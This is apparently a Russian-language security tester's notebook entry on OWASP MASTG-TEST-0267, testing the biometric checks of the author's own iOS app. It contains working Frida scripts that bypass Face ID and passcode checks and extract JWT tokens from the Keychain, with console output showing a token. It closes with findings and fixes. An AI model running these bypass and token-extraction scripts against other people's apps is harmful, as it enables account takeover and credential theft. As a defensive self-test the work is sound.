**MASTG-TEST-0266 (статический)** - смотрит, _написан ли_ код для биометрии, и как он реализован
**MASTG-TEST-0267 (динамический)** - проверяет, _действительно ли приложение правильно вызывает_ этот код во время работы

тест должен проверить 
«А работает ли биометрия так, как задумано, когда приложение запущено, и нельзя ли её обмануть?»

Основная цель - удостовериться, что приложение использует **привязанную к событию**биометрическую аутентификацию правильно, на этапе выполнения

-----------

план теста - искать в рантайме вызовы (буду перехватывать с Frida)
LAContext
evaluatePolicy
biometryCurrentSet
SecAccessControlCreateWithFlags

статическая часть данного теста находится 
здесь [[_L2__SAST_Keychain+Face-id__access-control]]

----------

тест провожу на приложении [[0_MeetWay]]
айфон 8 ios 16.7.14 джейлбрейк palera1n
для доступа к экрану в чатами - используется вызов-проверка Face-id
код для face-id настраивал здесь [[_R_detect_API-Screen_Lock-Face_ID_Touch ID]]

-------

приступаю к тесту

беру сборку здесь (так как до этого я ставил приложуху на обычный айфон - то дебаг сборка есть здесь) ()бесплантный xcode не дает на множество устройств ставить приложения просто...
`~/Library/Developer/Xcode/DerivedData`

беру бинарник app
и пересобираю его в .ipa

```shell
cd /Users/evgeniy/Desktop/с\ функцией\ face
mkdir Payload
cp -R MeetWay.app Payload/
zip -r MeetWay.ipa Payload/
rm -rf Payload
```

и закидываю ipa на айфон 

запустил приложение 

теперь подрубаю через ssh фриду

подрубаю фриду к айфону, там уде все настроено и готово - стоит и фрида и паралель и все че надо
 подробнее о настройке - можно найти в папке `tools`

подрубаю ssh для удобства

перв терминал
`iproxy 44444 44`
второй терминал
`ssh -p 44444 root@localhost`
стандарт пароль: alpine

на айфоне - сервер фриды
`sudo frida-server -l 0.0.0.0 `
Пароль: alpine

и после ввода пароля - терминал завис, типо это так и должно быть
и его нужно просто свернуть, но не закрывать

теперь на маке подкл
`frida-ps -H 192.168.0.107`


ЗАПУСКАЮ ПРИЛОЖЕНИЕ НА АЙФОНЕ

нахожу бандл айди или  pid

`frida-ps -Uai`
MeetWay         AIVARO22-2025-1.0
2388   MeetWay

или    frida-ps -Ua

2388   MeetWay         AIVARO22-2025-1.0



готовлю скрипт 

нужно искать 

LAContext
evaluatePolicy
biometryCurrentSet
SecAccessControlCreateWithFlags

```q
cat > ~/block-setup-ssl.js << 'ENDOFSCRIPT'

console.log("\n[😈] MASTG-TEST-0267 - Biometric Auth Observer");

// Сохраняем оригинальный console.log
var originalLog = console.log;

// Функция поиска модуля приложения
function findTargetModule() {
    var modules = Process.enumerateModules();
    for (var i = 0; i < modules.length; i++) {
        if (modules[i].name.indexOf("MeetWay") !== -1 || 
            modules[i].name.indexOf(".app") !== -1) {
            return modules[i];
        }
    }
    return null;
}

var targetModule = findTargetModule();
if (targetModule) {
    console.log(`[+] Target module: ${targetModule.name} @ ${targetModule.base}`);
}

// 1. Hook LAContext
try {
    var LAContext = ObjC.classes.LAContext;
    if (LAContext) {
        console.log("[✓] LAContext FOUND");
        
        // canEvaluatePolicy
        var canEvaluate = LAContext["- canEvaluatePolicy:error:"];
        Interceptor.attach(canEvaluate.implementation, {
            onEnter: function(args) {
                var policy = args[2].toInt32();
                var policyName = {
                    1: "deviceOwnerAuthenticationWithBiometrics",
                    2: "deviceOwnerAuthentication"
                }[policy] || `unknown(${policy})`;
                console.log(`[📞 canEvaluatePolicy] ${policyName}`);
            },
            onLeave: function(retval) {
                console.log(`   → Result: ${retval.toInt32() ? "YES" : "NO"}`);
            }
        });
        
        // evaluatePolicy - ГЛАВНЫЙ ВЫЗОВ FACE ID
        var evaluate = LAContext["- evaluatePolicy:localizedReason:reply:"];
        Interceptor.attach(evaluate.implementation, {
            onEnter: function(args) {
                var policy = args[2].toInt32();
                var reason = ObjC.Object(args[3]);
                console.log(`\n🚨🚨🚨 [FACE ID CALL] evaluatePolicy`);
                console.log(`   → Policy: ${policy == 2 ? 'deviceOwnerAuthentication' : policy == 1 ? 'biometrics' : policy}`);
                console.log(`   → Reason: "${reason}"`);
                console.log(`   → [ВНИМАНИЕ] Эта проверка может быть обойдена через Frida!`);
                
                // Stack trace
                console.log("   📍 Stack trace:");
                var trace = Thread.backtrace(this.context, Backtracer.ACCURATE);
                for (var i = 0; i < Math.min(trace.length, 5); i++) {
                    var addr = trace[i];
                    var module = Process.findModuleByAddress(addr);
                    if (module) {
                        var offset = addr.sub(module.base);
                        console.log(`      → ${module.name}+0x${offset.toString(16)}`);
                    }
                }
            }
        });
        console.log("[✓] evaluatePolicy hooked");
    }
} catch(e) {
    console.log(`[!] LAContext hook error: ${e.message}`);
}

// 2. Hook Security Framework (Keychain)
try {
    // SecItemAdd - сохранение
    var SecItemAdd = Module.findExportByName("Security", "SecItemAdd");
    if (SecItemAdd) {
        Interceptor.attach(SecItemAdd, {
            onEnter: function(args) {
                var query = ObjC.Object(args[0]);
                console.log(`\n[💾 SecItemAdd] Saving to Keychain`);
                
                // Проверяем наличие биометрии
                var accessControl = query.objectForKeyedSubscript("kSecAttrAccessControl");
                if (accessControl) {
                    console.log(`   ✅ HAS biometric protection (AccessControl present)`);
                } else {
                    console.log(`   ❌ NO biometric protection!`);
                }
                
                // Что сохраняем?
                var service = query.objectForKeyedSubscript("kSecAttrService");
                var account = query.objectForKeyedSubscript("kSecAttrAccount");
                if (service) console.log(`   → Service: ${service}`);
                if (account) console.log(`   → Account: ${account}`);
            }
        });
        console.log("[✓] SecItemAdd hooked");
    }
    
    // SecItemCopyMatching - чтение
    var SecItemCopyMatching = Module.findExportByName("Security", "SecItemCopyMatching");
    if (SecItemCopyMatching) {
        Interceptor.attach(SecItemCopyMatching, {
            onEnter: function(args) {
                console.log(`\n[📖 SecItemCopyMatching] Reading from Keychain`);
                var query = ObjC.Object(args[0]);
                var service = query.objectForKeyedSubscript("kSecAttrService");
                if (service) console.log(`   → Service: ${service}`);
            }
        });
        console.log("[✓] SecItemCopyMatching hooked");
    }
    
    // SecAccessControlCreateWithFlags - создание флагов
    var SecAccessControlCreateWithFlags = Module.findExportByName("Security", "SecAccessControlCreateWithFlags");
    if (SecAccessControlCreateWithFlags) {
        Interceptor.attach(SecAccessControlCreateWithFlags, {
            onEnter: function(args) {
                var flags = args[3].toInt32();
                var flagsList = [];
                if (flags & 0x1) flagsList.push("kSecAccessControlBiometryAny");
                if (flags & 0x2) flagsList.push("kSecAccessControlBiometryCurrentSet");
                if (flags & 0x4) flagsList.push("kSecAccessControlUserPresence");
                if (flags & 0x8) flagsList.push("kSecAccessControlPasscode");
                console.log(`\n[🔧 SecAccessControlCreateWithFlags] Flags: ${flagsList.join(", ")}`);
            }
        });
        console.log("[✓] SecAccessControlCreateWithFlags hooked");
    }
} catch(e) {
    console.log(`[!] Security hooks error: ${e.message}`);
}

console.log("\n[✅] MASTG-TEST-0267 Observer готов!");
console.log("[💡] Теперь выполни в приложении действия, требующие Face ID\n");

ENDOFSCRIPT
```
подсасываюсь к процессу приложения 

`frida -U 2388 -l ~/block-setup-ssl.js`

ну вот, спокойно перехватываю функции связанные с биометрией и с проверкой на наличие блокировки экрана

deviceOwnerAuthenticationWithBiometrics
и
deviceOwnerAuthentication

оба результаты NO - так как на моей телефоне с джейлбрейком не установлены ни пароли ни Face-id

<img src="../../../assets/Снимок2026-04-3019.06.58.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



```q
[iPhone::PID::2388 ]-> [📞 canEvaluatePolicy] deviceOwnerAuthenticationWithBiometrics
   → Result: NO
[iPhone::PID::2388 ]-> %resume
[iPhone::PID::2388 ]->
[iPhone::PID::2388 ]->
[iPhone::PID::2388 ]-> [📞 canEvaluatePolicy] deviceOwnerAuthentication
   → Result: NO
[iPhone::PID::2388 ]-> %resume
[iPhone::PID::2388 ]->
```

попробую перехватить deviceOwnerAuthentication и изменить результат выполнения функции


делаю скрипт  для хука функции deviceOwnerAuthentication


```js
cat > ~/block-setup-ssl.js << 'ENDOFSCRIPT'

console.log("\n[🔓] BYPASS deviceOwnerAuthentication");

var LAContext = ObjC.classes.LAContext;

// подмена canEvaluatePolicy
var canEvaluate = LAContext["- canEvaluatePolicy:error:"];
Interceptor.attach(canEvaluate.implementation, {
    onEnter: function(args) {
        var policy = args[2].toInt32();
        if (policy == 2) { // deviceOwnerAuthentication
            console.log("[!] Перехвачен deviceOwnerAuthentication");
        }
    },
    onLeave: function(retval) {
        retval.replace(ptr(1)); // меняем NO на YES
        console.log("[✓] Результат изменён на YES");
    }
});

// подмена evaluatePolicy
var evaluate = LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(evaluate.implementation, {
    onEnter: function(args) {
        var policy = args[2].toInt32();
        if (policy == 2) {
            var reply = new ObjC.Block(args[4]);
            console.log("[!] Перехвачен evaluatePolicy, вызываем success");
            reply(ptr(1), ptr(0)); // сразу success
            args[4] = ptr(0); // отменяем оригинал
        }
    }
});

console.log("[✅] Готово. deviceOwnerAuthentication обойдён!");

ENDOFSCRIPT
```


`frida -U 2388 -l ~/block-setup-ssl.js`

и вуаля!!! 

```
[iPhone::PID::2388 ]-> [!] Перехвачен deviceOwnerAuthentication
[✓] Результат изменён на YES
```

<img src="../../../assets/Снимок2026-04-3019.13.32.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



и я спокойно - изменил возвращаемое значение функции и попал на экран настройки, хотя он до хука не открывался, так как требовал, чтобы экран блокировки айфона имел защиту в виде пароля!

<img src="../../../assets/Снимок2026-04-3019.14.53.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />




-------

теперь я перезайду в приложение с первым скриптом, чтобы попробовать перехватить кейчан - операции


делаю скрипт  для детекта кейчен функций


``` js
cat > ~/block-setup-ssl.js << 'ENDOFSCRIPT'

// Улучшенный Keychain Monitor для Frida 17+
console.log("\n" + "=".repeat(60));
console.log("[🔐] ADVANCED KEYCHAIN MONITOR v4.0 (Frida 17+ Safe)");
console.log("=".repeat(60) + "\n");

// Безопасно получаем модуль Security
var securityModule = null;
try {
    securityModule = Process.getModuleByName("Security");
    console.log("[✓] Security module found @ " + securityModule.base);
} catch(e) {
    console.log("[!] Security module not found: " + e.message);
}

// ============================================
// Функция безопасного логирования аргументов
// ============================================
function safeLogQuery(args, isSecItemAdd = false) {
    try {
        // Пытаемся преобразовать первый аргумент в объект NSDictionary
        var query = ObjC.Object(args[0]);
        if (!query || query.$className !== "NSDictionary") {
            // Если не словарь, возможно, это CFDictionaryRef, пробуем другой подход
            console.log("   [RAW] Query ptr: " + args[0]);
            console.log("   [RAW] Query class: " + (query ? query.$className : "null"));
            return;
        }

        // Безопасное чтение ключей
        var service = safeGetString(query, "kSecAttrService");
        var account = safeGetString(query, "kSecAttrAccount");
        var accessControl = safeGetObject(query, "kSecAttrAccessControl");
        
        if (service) console.log("   → Service: " + service);
        if (account) console.log("   → Account: " + account);
        
        // Для SecItemAdd особенно важно проверить наличие биометрии
        if (isSecItemAdd) {
            if (accessControl) {
                console.log("   ✅ HAS BIOMETRY FLAG!");
            } else {
                console.log("   ❌ NO BIOMETRY FLAG!");
                // Пытаемся прочитать флаги доступа, если есть
                try {
                    var accessible = query.objectForKeyedSubscript("kSecAttrAccessible");
                    if (accessible) console.log("   → Accessible: " + accessible);
                } catch(e) {}
            }
        }
        
        // Пробуем прочитать длину данных (без извлечения самого большого BLOB'а)
        if (isSecItemAdd) {
            try {
                var valueData = query.objectForKeyedSubscript("kSecValueData");
                if (valueData && valueData.length) {
                    console.log("   → Data size: " + valueData.length() + " bytes");
                }
            } catch(e) {}
        }
    } catch(e) {
        console.log("   [Error parsing query] " + e.message);
        console.log("   [RAW] args[0]: " + args[0]);
    }
}

function safeGetString(dict, key) {
    try {
        var val = dict.objectForKeyedSubscript(key);
        if (val && val.toString) {
            var str = val.toString();
            if (str && str !== "") return str;
        }
        return null;
    } catch(e) {
        return null;
    }
}

function safeGetObject(dict, key) {
    try {
        return dict.objectForKeyedSubscript(key);
    } catch(e) {
        return null;
    }
}

// ============================================
// Функция для хука через правильный API Frida 17+
// ============================================
function safeHook(funcName) {
    if (!securityModule) return false;
    
    try {
        var addr = securityModule.findExportByName(funcName);
        if (addr && !addr.isNull()) {
            Interceptor.attach(addr, {
                onEnter: function(args) {
                    console.log("\n[🔑] " + funcName + " CALLED");
                    // Передаем флаг isSecItemAdd для специфической обработки
                    if (funcName === "SecItemAdd") {
                        safeLogQuery(args, true);
                    } else if (funcName === "SecItemCopyMatching") {
                        safeLogQuery(args, false);
                    } else if (funcName === "SecItemDelete") {
                        try {
                            var query = ObjC.Object(args[0]);
                            var service = safeGetString(query, "kSecAttrService");
                            if (service) console.log("   → Deleting Service: " + service);
                        } catch(e) {
                            console.log("   [RAW] Delete query ptr: " + args[0]);
                        }
                    } else if (funcName === "SecAccessControlCreateWithFlags") {
                        var flags = args[3].toInt32();
                        var flagsList = [];
                        if (flags & 0x1) flagsList.push("BiometryAny");
                        if (flags & 0x2) flagsList.push("BiometryCurrentSet");
                        if (flags & 0x4) flagsList.push("UserPresence");
                        if (flagsList.length > 0) {
                            console.log("   🔧 Flags: " + flagsList.join(", "));
                        } else {
                            console.log("   🔧 Raw flags value: " + flags);
                        }
                    }
                },
                onLeave: function(retval) {
                    if (funcName === "SecItemAdd" || funcName === "SecItemCopyMatching") {
                        console.log("   ← Return code: " + retval);
                    }
                }
            });
            console.log("[✓] HOOKED: " + funcName);
            return true;
        } else {
            console.log("[✗] NOT FOUND: " + funcName);
            return false;
        }
    } catch(e) {
        console.log("[✗] ERROR hooking " + funcName + ": " + e.message);
        return false;
    }
}

// ============================================
// Запуск хуков для всех нужных функций
// ============================================
console.log("[*] Hooking Security.framework functions...\n");
safeHook("SecItemAdd");
safeHook("SecItemCopyMatching");
safeHook("SecItemDelete");
safeHook("SecItemUpdate");
safeHook("SecAccessControlCreateWithFlags");

// ============================================
// РАСШИРЕННАЯ ДЕТЕКЦИЯ И БАЙПАС FACE ID
// ============================================
console.log("\n[*] Hooking LAContext (Face ID)...");
try {
    var LAContext = ObjC.classes.LAContext;
    if (LAContext) {
        // 1. Детекция проверки доступности биометрии
        var canEvaluate = LAContext["- canEvaluatePolicy:error:"];
        if (canEvaluate) {
            Interceptor.attach(canEvaluate.implementation, {
                onEnter: function(args) {
                    var policy = args[2].toInt32();
                    console.log("\n[📋] LAContext.canEvaluatePolicy called");
                    console.log("   Policy: " + (policy === 1 ? "DeviceOwnerAuthenticationWithBiometrics" : "DeviceOwnerAuthentication"));
                },
                onLeave: function(retval) {
                    var result = retval.toInt32() ? "YES ✅" : "NO ❌";
                    console.log("   → Biometry available: " + result);
                }
            });
            console.log("[✓] LAContext.canEvaluatePolicy hooked");
        }
        
        // 2. Основной вызов Face ID (уже был, но дополним)
        var evaluate = LAContext["- evaluatePolicy:localizedReason:reply:"];
        if (evaluate) {
            Interceptor.attach(evaluate.implementation, {
                onEnter: function(args) {
                    var policy = args[2].toInt32();
                    var reason = ObjC.Object(args[3]);
                    console.log("\n[🚨] FACE ID TRIGGERED!");
                    console.log("   Policy: " + (policy === 2 ? "deviceOwnerAuthentication" : "deviceOwnerAuthenticationWithBiometrics"));
                    console.log("   Reason: " + reason);
                    console.log("   ⚠️ Manual biometric check — vulnerable to Frida bypass!");
                    
                    // Сохраняем reply блок для возможного автоматического байпаса
                    this.reply = new ObjC.Block(args[4]);
                },
                onLeave: function(retval) {
                    // ОБОЙТИ FACE ID
                    
                  
                    if (this.reply) {
                        console.log("[🔥] BYPASSING Face ID automatically!");
                        this.reply(ptr(1), ptr(0)); // (success=true, error=nil)
                    }
                    
                }
            });
            console.log("[✓] LAContext.evaluatePolicy hooked");
        }
        
        // 3. Дополнительный хук на setLocalizedReason (иногда используется)
        var setReason = LAContext["- setLocalizedReason:"];
        if (setReason) {
            Interceptor.attach(setReason.implementation, {
                onEnter: function(args) {
                    var reason = ObjC.Object(args[2]);
                    console.log("\n[✏️] LAContext.setLocalizedReason: \"" + reason + "\"");
                }
            });
            console.log("[✓] LAContext.setLocalizedReason hooked");
        }
        
        // 4. Дополнительный хук на setLocalizedFallbackTitle
        var setFallback = LAContext["- setLocalizedFallbackTitle:"];
        if (setFallback) {
            Interceptor.attach(setFallback.implementation, {
                onEnter: function(args) {
                    var title = ObjC.Object(args[2]);
                    if (title) console.log("[✏️] LAContext.setLocalizedFallbackTitle: \"" + title + "\"");
                }
            });
            console.log("[✓] LAContext.setLocalizedFallbackTitle hooked");
        }
        
        // 5. INACTIVE TIMEOUT (редко, но бывает)
        var setInactiveTimeout = LAContext["- setInactiveTimeout:"];
        if (setInactiveTimeout) {
            Interceptor.attach(setInactiveTimeout.implementation, {
                onEnter: function(args) {
                    var timeout = args[2].toInt32();
                    console.log("[⏱️] LAContext.setInactiveTimeout: " + timeout + " sec");
                }
            });
            console.log("[✓] LAContext.setInactiveTimeout hooked");
        }
    } else {
        console.log("[✗] LAContext class not found");
    }
} catch(e) {
    console.log("[!] LAContext error: " + e.message);
}

// ============================================
// ИНФОРМАЦИЯ О ТОМ, КАК ВКЛЮЧИТЬ БАЙПАС
// ============================================
console.log("\n" + "=".repeat(60));
console.log("[✅] ADVANCED MONITOR ACTIVE");
console.log("=".repeat(60));
console.log("\n[💡] To see Keychain operations:");
console.log("   1. Logout and Login again → see SecItemAdd & BIOMETRY FLAGS");
console.log("   2. Read token → SecItemCopyMatching");
console.log("\n[💡] Face ID detection active:");
console.log("   → Open protected chat to trigger biometric prompt");
console.log("\n[🔥] AUTO-BYPASS MODE (disabled by default)");
console.log("   → To enable bypass, uncomment lines 260-264 in evaluatePolicy.onLeave");
console.log("   → Then Face ID will be automatically bypassed!\n");

ENDOFSCRIPT
```


`frida -U 2727 -l ~/block-setup-ssl.js`


и вижу перехваченные вызовы:

перехватил и кейчейн операции   и биометрию

также видно, что кейчейн-операции не используют фейс-айди - но им это и не нужно, это же просто JWT токен!

но зато тут большой практический смысл - так как можно перехватывать все это дело, и подменять результаты функций!

по факту - все норм в приложении этом

но также по факту - тест провален!

так как - должна была быть проверка фейс-ай-ди при получении значений из кейчейн !

и сама биометрия должна быть реализована не ручной проверкой в коде, а должна быть завязана на операции кейчейн! и тогда фридой просто так не получится перехватить ее!

также без проблем получилось обойти проверку биометрии


```q
Attaching...

============================================================
[🔐] ADVANCED KEYCHAIN MONITOR v4.0 (Frida 17+ Safe)
============================================================

[✓] Security module found @ 0x1a60d6000
[*] Hooking Security.framework functions...

[✓] HOOKED: SecItemAdd
[✓] HOOKED: SecItemCopyMatching
[✓] HOOKED: SecItemDelete
[✓] HOOKED: SecItemUpdate
[✓] HOOKED: SecAccessControlCreateWithFlags

[*] Hooking LAContext (Face ID)...
[✓] LAContext.canEvaluatePolicy hooked
[✓] LAContext.evaluatePolicy hooked
[✓] LAContext.setLocalizedReason hooked
[✓] LAContext.setLocalizedFallbackTitle hooked

============================================================
[✅] ADVANCED MONITOR ACTIVE
============================================================

[💡] To see Keychain operations:
   1. Logout and Login again → see SecItemAdd & BIOMETRY FLAGS
   2. Read token → SecItemCopyMatching

[💡] Face ID detection active:
   → Open protected chat to trigger biometric prompt

[🔥] AUTO-BYPASS MODE (disabled by default)
   → To enable bypass, uncomment lines 260-264 in evaluatePolicy.onLeave
   → Then Face ID will be automatically bypassed!

[iPhone::PID::2727 ]->

[🔑] SecItemCopyMatching CALLED
   [RAW] Query ptr: 0x283f62160
   [RAW] Query class: _TtGCs26_SwiftDeferredNSDictionaryaSo11CFStringRefP__$
   ← Return code: 0x0

[🔑] SecItemDelete CALLED

[🔑] SecItemAdd CALLED
   [RAW] Query ptr: 0x283fe7510
   [RAW] Query class: _TtGCs26_SwiftDeferredNSDictionaryaSo11CFStringRefP__$
   ← Return code: 0x0

[🔑] SecItemCopyMatching CALLED
   [RAW] Query ptr: 0x283fe4900
   [RAW] Query class: _TtGCs26_SwiftDeferredNSDictionarySSP__$
   ← Return code: 0xffff9d2c

[🔑] SecItemCopyMatching CALLED
   [RAW] Query ptr: 0x283fe2be0
   [RAW] Query class: _TtGCs26_SwiftDeferredNSDictionarySSP__$
   ← Return code: 0x0

🟢 ЗДЕСЬ Я ПЫТАЛСЯ ОТКРЫТЬ ЭКРАН ЧАТОВ ЗАЩИЩЕННЫЙ ФЕЙС-id
(но так как - на айфоне не установлен он - то ответ перехвачен NO)
[📋] LAContext.canEvaluatePolicy called
   Policy: DeviceOwnerAuthenticationWithBiometrics
   → Biometry available: NO ❌ 
   
🟢 ЗДЕСЬ Я ПЫТАЛСЯ ОТКРЫТЬ ЭКРАН НАСТРОЕК ЗАЩИЩЕННЫЙ ПРОВЕРКОЙ НА НАЛИЧИЕ ПАРОЛЯ НА САМОМ АЙФОНЕ
(но так как - на айфоне не установлен он - то ответ перехвачен NO)
[📋] LAContext.canEvaluatePolicy called
   Policy: DeviceOwnerAuthentication
   → Biometry available: NO ❌

[🔑] SecItemCopyMatching CALLED
   [RAW] Query ptr: 0x283e27570
   [RAW] Query class: _TtGCs26_SwiftDeferredNSDictionarySSP__$
   ← Return code: 0x0

[🔑] SecItemCopyMatching CALLED
   [RAW] Query ptr: 0x283e279c0
   [RAW] Query class: _TtGCs26_SwiftDeferredNSDictionarySSP__$
   ← Return code: 0x0


```

-------------

#### и вот так можно вытащить сами значения токенов!

``` js
cat > ~/block-setup-ssl.js << 'ENDOFSCRIPT'

// ============================================
// KEYCHAIN EXPLOIT - Extract JWT Token
// ============================================
console.log("\n[🔥] KEYCHAIN EXPLOIT - Token Extractor\n");

var securityModule = Process.getModuleByName("Security");
console.log("[✓] Security module found @ " + securityModule.base);

// ============================================
// Хук SecItemCopyMatching - читаем данные
// ============================================
var SecItemCopyMatching = securityModule.findExportByName("SecItemCopyMatching");
if (SecItemCopyMatching) {
    Interceptor.attach(SecItemCopyMatching, {
        onEnter: function(args) {
            this.outValue = args[1]; // CFTypeRef * (куда запишется результат)
            
            // Пытаемся понять, что читают
            try {
                var query = ObjC.Object(args[0]);
                var service = query.objectForKeyedSubscript("kSecAttrService");
                var account = query.objectForKeyedSubscript("kSecAttrAccount");
                if (service) console.log("[📖] Reading: " + service);
                if (account) console.log("    Account: " + account);
            } catch(e) {}
        },
        onLeave: function(retval) {
            // errSecSuccess = 0
            if (retval.toInt32() === 0 && this.outValue) {
                try {
                    var dataPtr = this.outValue.readPointer();
                    if (!dataPtr.isNull()) {
                        var data = ObjC.Object(dataPtr);
                        
                        // Пробуем как NSData
                        if (data && data.bytes && data.length) {
                            var length = data.length();
                            var bytes = data.bytes().readByteArray(length);
                            var extracted = String.fromCharCode.apply(null, new Uint8Array(bytes));
                            
                            console.log("\n" + "=".repeat(60));
                            console.log("[🔥🔥🔥] TOKEN EXTRACTED SUCCESSFULLY!");
                            console.log("=".repeat(60));
                            console.log("📦 Token (" + length + " bytes):");
                            console.log(extracted);
                            console.log("=".repeat(60));
                            console.log("[✅] PROOF: Keychain data retrieved without biometrics!\n");
                        } 
                        // Пробуем как NSString
                        else if (data && data.toString) {
                            console.log("\n[🔥] TOKEN: " + data.toString());
                        }
                    }
                } catch(e) {
                    // Не парсим, просто логируем что прочитали
                    console.log("[✓] Keychain read successful, but data format is Swift-native");
                }
            }
        }
    });
    console.log("[✓] HOOKED: SecItemCopyMatching");
}

// ============================================
// Хук SecItemAdd - логируем сохранение
// ============================================
var SecItemAdd = securityModule.findExportByName("SecItemAdd");
if (SecItemAdd) {
    Interceptor.attach(SecItemAdd, {
        onEnter: function(args) {
            try {
                var query = ObjC.Object(args[0]);
                var service = query.objectForKeyedSubscript("kSecAttrService");
                var accessControl = query.objectForKeyedSubscript("kSecAttrAccessControl");
                
                console.log("\n[💾] Saving to Keychain");
                if (service) console.log("    Service: " + service);
                if (accessControl) {
                    console.log("    ✅ Has biometric flag");
                } else {
                    console.log("    ❌ NO BIOMETRIC FLAG - VULNERABLE!");
                }
            } catch(e) {}
        }
    });
    console.log("[✓] HOOKED: SecItemAdd");
}

// ============================================
// Хук SecItemDelete - логируем удаление
// ============================================
var SecItemDelete = securityModule.findExportByName("SecItemDelete");
if (SecItemDelete) {
    Interceptor.attach(SecItemDelete, {
        onEnter: function(args) {
            console.log("\n[🗑] Deleting from Keychain");
        }
    });
    console.log("[✓] HOOKED: SecItemDelete");
}

console.log("\n" + "=".repeat(60));
console.log("[✅] EXPLOIT READY - Waiting for Keychain operations");
console.log("=".repeat(60));
console.log("\n[💡] Do this:");
console.log("   1. If logged in → Logout (see Delete)");
console.log("   2. Login again → Token will be saved and read");
console.log("   3. TOKEN WILL APPEAR IN CONSOLE!\n");

ENDOFSCRIPT
```


`frida -U 2727 -l ~/block-setup-ssl.js`

получилось достать сами токены

```q
============================================================
[✅] EXPLOIT READY - Waiting for Keychain operations
============================================================

[💡] Do this:
   1. If logged in → Logout (see Delete)
   2. Login again → Token will be saved and read
   3. TOKEN WILL APPEAR IN CONSOLE!

[iPhone::PID::2727 ]->
============================================================
[🔥🔥🔥] TOKEN EXTRACTED SUCCESSFULLY!
============================================================
📦 Token (285 bytes):
eyJhbGciOiJIUzI1Nweg354XVCJ9.eyJ5YW5425hgwergzNzgyIiwibG9naW4iOiJzb2FwMjIyMjIyIiwiZW1haWwiOiJzb2FwMjIyMjIyQHlhbmRleC5ydSw45g45ggLPQtdCrgwethwrth245yergw35gCJleHAiOjE3Nzc2NDkzNzV9.Hcqp1sZ_bPOX3mmaNBKrW_raVh5pypW8Fd_96mEzC4A
============================================================
[✅] PROOF: Keychain data retrieved without biometrics!
```

но от фриды защититься можно только комбинированно

чтобы максимально усложнить жизнь - то можно было бы сделать так защиту:

1 - обфускация имен
2 - шифрование  XOR для строк - которые ищет приложение (типо frida..итп) строки поиска типа /Applications/Cydia.app, cydia://...
3 - путать логику в функция
4 - сделать чтобы функция проверки детекции возвращала не false/true а какие - то обфусцированные буквы или назвать существующими безобидными именами классов/методов
5 - сделать несколько урвоней защиты от джейл - брейка, несколько функция - в разных местах кода с разными сигнарурами и обфускациями, и динамически вызывать эти методы в разных местах
6 - удалять данные сохраненные в приложении при обнаружении детекции
7 - менять логику функции так , чтобы не этой логике были завязаны и другие функции  - без которых приложение не запустилось бы, напрмиер функции  показа стартовых экранов или этапа авторизации, и тогда - даже при обходе функции детекта - все крашилось бы
8 - вызов функции детекта - в разных местах кода
9- - ну и добавить контроль хеша + контроль целостности подписи



-------
## Результаты MASTG-TEST-0266 / 0267
```c

### Динамический анализ (Frida 17+)
- ✅ Перехвачены реальные вызовы Keychain операций
- ❌ Отсутствуют вызовы `SecAccessControlCreateWithFlags` — данные хранятся БЕЗ биометрии
- ⚠️ Обнаружены ручные вызовы `LAContext.canEvaluatePolicy` для проверки Face ID
-  ☠️ Получилось - без проблем -перехватить и токен JWT и, что касается теста - хукнуть сам Face-id!
- ☠️ если бы сохраняли значения в кейчейн с флагом  kSecAccessControlBiometryCurrentSet - то достать значения было бы сложнее, так как проверка face id шла бы из системы ios - а не из кода моего приложения!
  
### Риски
1. JWT токен может быть извлечен из Keychain без подтверждения личности
2. Проверка Face ID может быть обойдена через Frida hook
   
   
### Рекомендации
1. Использовать `kSecAccessControlBiometryCurrentSet` при сохранении токена
2. Удалить ручную проверку `LAContext.canEvaluatePolicy`
3. Позволить Keychain самому запрашивать биометрию при доступе к данным
   
   --------------------
   
   Биометрическая проверка выполняется в user-space через LAContext.evaluatePolicy, результат - обычный boolean. Скрипт на Frida может просто перехватить этот вызов и вернуть true, а приложение послушно отдаст доступ. Это фундаментальная архитектурная ошибка, известная как _"клиент не должен доверять клиенту"_
   
   Токен сохраняется в Keychain без флага kSecAccessControlBiometryCurrentSet. Из-за этого Keychain сам не запрашивает Face ID при доступе. 
   Скрипт SecItemCopyMatching просто читает значение из хранилища, так как система не требует аутентификации пользователя. Это прямое нарушение практик OWASP MASTG
   
```
